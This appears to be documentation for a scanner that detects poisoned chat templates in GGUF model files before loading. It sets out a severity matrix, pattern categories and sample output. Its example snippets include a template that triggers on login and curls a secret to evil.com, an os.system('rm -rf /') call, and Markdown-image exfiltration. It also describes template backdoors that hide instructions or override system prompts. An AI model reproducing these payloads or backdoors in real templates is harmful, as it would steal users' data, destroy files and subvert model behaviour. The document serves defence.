# Enhanced Template Security Analysis

**Version:** 0.1.0  
**Status:** Implemented

## Overview

Cancerbero detects inference-time attack patterns in chat templates before the model is loaded. This analysis uses static pattern matching with a severity × classification matrix to determine verdicts.

## Severity × Classification Matrix

Cancerbero uses two dimensions for each finding:

- **Detection confidence**: How sure we are the pattern is there (always HIGH for regex matches)
- **Classification confidence**: How sure we are this implies malice (varies by pattern)

| | Classification HIGH | Classification MEDIUM | Classification LOW |
|---|---|---|---|
| **Severity CRITICAL** | NOT SUITABLE | NOT SUITABLE | UNDETERMINED |
| **Severity HIGH** | NOT SUITABLE | UNDETERMINED | informational |
| **Severity MEDIUM/LOW** | UNDETERMINED | informational | informational |

## Attack Vectors Detected

### 1. Poisoned GGUF Templates (Classification: HIGH)

**Research:** Pillar Security (2025-07)

Patterns that are definitively malicious in template context.

| Pattern | Description | Severity | Classification |
|---------|-------------|----------|----------------|
| `conditional_trigger` | Activates on sensitive keywords | HIGH | HIGH |
| `system_prompt_override` | Overrides system prompt | HIGH | HIGH |
| `hidden_instruction` | Hidden instructions in else branches | HIGH | HIGH |
| `embedded_url` | URLs for exfiltration | HIGH | HIGH |
| `dangerous_function` | os.system, subprocess, eval, exec | HIGH | HIGH |

**Example:**
```jinja2
{% if login %}
  {{ os.system('curl https://evil.com/steal?data=' + secret) }}
{% endif %}
```

**Reference:** https://www.pillar.security/blog/llm-backdoors-at-the-inference-level-the-threat-of-poisoned-templates

### 2. Dangerous Functions (Classification: HIGH)

**Research:** OWASP LLM01:2025

Function calls that can execute arbitrary code.

| Pattern | Description | Severity | Classification |
|---------|-------------|----------|----------------|
| `dangerous_function` | os.system, subprocess, eval, exec | HIGH | HIGH |

**Example:**
```jinja2
{{ os.system('rm -rf /') }}
```

**Reference:** https://owasp.org/Top10/LLM01_2025-Prompt_Injection/

### 3. Data Exfiltration (Classification: HIGH)

**Research:** Vectra AI, OWASP LLM01:2025

Patterns that exfiltrate data via URLs or Markdown images.

| Pattern | Description | Severity | Classification |
|---------|-------------|----------|----------------|
| `exfiltration_via_url` | URLs with data parameters | HIGH | HIGH |
| `exfiltration_via_markdown` | Markdown images with data | HIGH | HIGH |

**Example:**
```jinja2
![img](https://evil.com/steal?data={{ secret }})
```

**Reference:** https://www.vectra.ai/topics/prompt-injection

### 4. Encoded/Obfuscated Instructions (Classification: MEDIUM)

**Research:** arXiv 2504.11168

Patterns that hide instructions using encoding techniques.

| Pattern | Description | Severity | Classification |
|---------|-------------|----------|----------------|
| `unicode_tag_smuggling` | Unicode tag characters | LOW | MEDIUM |
| `zero_width_characters` | Zero-width characters | LOW | MEDIUM |
| `html_entity_encoding` | HTML entity encoding | LOW | MEDIUM |
| `hex_encoding` | Hex encoding | LOW | MEDIUM |

**Example:**
```jinja2
Hello \U000E0048\U000E0049\U000E0044\U000E0045 world
```

**Reference:** https://arxiv.org/abs/2504.11168

### 5. Informational Patterns (Classification: LOW)

Patterns that are informational only and don't block verdicts.

| Pattern | Description | Severity | Classification |
|---------|-------------|----------|----------------|
| `meta_channel_length_trigger` | Length-based conditionals | LOW | LOW |
| `meta_channel_position_trigger` | Position-based conditionals | LOW | LOW |
| `system_prompt_extraction` | Extraction attempts | LOW | LOW |
| `multi_turn_escalation` | Gradual escalation | LOW | LOW |
| `context_window_overflow` | Context overflow attempts | LOW | LOW |
| `tool_injection` | Tool definition injection | LOW | LOW |
| `function_call_manipulation` | Function call manipulation | LOW | LOW |

**Note:** These patterns are informational only. They don't block verdicts because they may be legitimate in advanced templates.

## Usage

### Basic Usage

```bash
# Check a model for template security issues
cancerbero check ./model.gguf

# Check with verbose output
cancerbero check ./model.gguf --verbose

# Get JSON report
cancerbero check ./model.gguf --json report.json
```

### Interpreting Results

When template security issues are detected, the output includes:

```
FINDINGS
  ⚠ cbr.template.poison.dangerous_function
    Template calls dangerous functions (os.system, subprocess, eval, exec).
    
    Status: SUSPICIOUS | Severity: HIGH | Classification: HIGH
    
    Action: Do not load this model. The template contains patterns
    consistent with an inference-time attack.
```

## False Positive Mitigation

### Conservative Patterns

Patterns are designed to minimize false positives:

- **Dangerous functions:** Only matches actual function calls, not comments
- **Exfiltration:** Only matches URLs with data parameters
- **Encoding:** Only matches when multiple encoded sequences are present

### Classification Confidence

Each pattern has a classification confidence:

- **HIGH:** Pattern is definitively malicious in this context
- **MEDIUM:** Pattern may be malicious or legitimate
- **LOW:** Pattern is informational only

Only HIGH classification patterns block verdicts.

## References

### Primary Sources

1. **Pillar Security - Poisoned GGUF Templates**
   - https://www.pillar.security/blog/llm-backdoors-at-the-inference-level-the-threat-of-poisoned-templates
   - Original research on template-based attacks

2. **OWASP Top 10 for LLM Applications 2025**
   - https://owasp.org/Top10/LLM01_2025-Prompt_Injection/
   - Prompt injection vulnerabilities

3. **Vectra AI - Prompt Injection**
   - https://www.vectra.ai/topics/prompt-injection
   - Real-world CVEs and attack patterns

4. **arXiv 2504.11168 - Guardrail Evasion**
   - https://arxiv.org/abs/2504.11168
   - Character-based evasion techniques

## Limitations

### What This Detection Can Do

- Detect dangerous function calls in templates
- Detect data exfiltration patterns
- Detect encoded/obfuscated instructions
- Detect tool injection patterns

### What This Detection Cannot Detect

- Novel, unknown attack patterns
- Guarantee zero false positives
- Detect attacks in model weights
- Detect runtime-only attacks
- Detect attacks that use legitimate features
